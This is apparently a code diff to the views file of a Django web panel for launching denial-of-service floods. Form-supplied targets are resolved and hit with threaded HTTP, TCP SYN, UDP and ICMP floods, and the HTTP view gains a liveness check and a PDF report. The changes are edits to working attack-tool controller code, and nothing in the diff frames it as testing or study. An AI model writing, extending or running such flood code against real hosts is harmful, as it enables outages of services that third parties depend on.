@@ -24,18 +24,20 @@ def index(request):
 def Http_Flood(request):
     if request.method == "POST":
         dst     = request.POST["dst"]
-        port    = 80
+        dport    = 80
         flag    = "S"
         method = request.POST["method"]
         count   = request.POST["count"]
 
-        if "http" in dst:
+        if "com" in dst:
             tmp = Resolve(dst)
             dst = tmp.Get()
-        attack = HTTPFlood(dst,port,flag,method,count)
+
+        attack = HTTPFlood(dst,dport,flag,method,count)
         attack.ThreadStart()
 
-        
+        gecici = isAlive(dst, dport)
+        CreatePDF("HTTP {}".format(method), gecici)
 
         return render(request, "Http_Flood.html", {})
     elif request.method == "GET":
@@ -48,10 +50,9 @@ def Tcp_Flood(request):
         flag = request.POST["flag"]
         count = request.POST["count"]
 
-        if "http" in dst:
-            tut = Resolve(dst)
-            dst = tut.Get()
-            print dst
+        if "com" in dst:
+            tmp = Resolve(dst)
+            dst = tmp.Get()
 
         tmp = TCPFlood(dst,dport,flag,count)
         tmp.ThreadStart()
@@ -69,10 +70,9 @@ def Udp_Flood(request):
         dport = request.POST["dport"]
         count = request.POST["count"]
 
-        if "http" in dst:
-            tut = Resolve(dst)
-            dst = tut.Get()
-            print dst
+        if "com" in dst:
+            tmp = Resolve(dst)
+            dst = tmp.Get()
 
         tmp = UDPFlood(dst,dport,count)
         tmp.ThreadStart()
@@ -90,10 +90,9 @@ def Icmp_Flood(request):
         dst   = request.POST["dst"]
         count = request.POST["count"]
 
-        if "http" in dst:
-            tut = Resolve(dst)
-            dst = tut.Get()
-            print dst
+        if "com" in dst:
+            tmp = Resolve(dst)
+            dst = tmp.Get()
 
 
         icmp = ICMPFlood(dst,count)
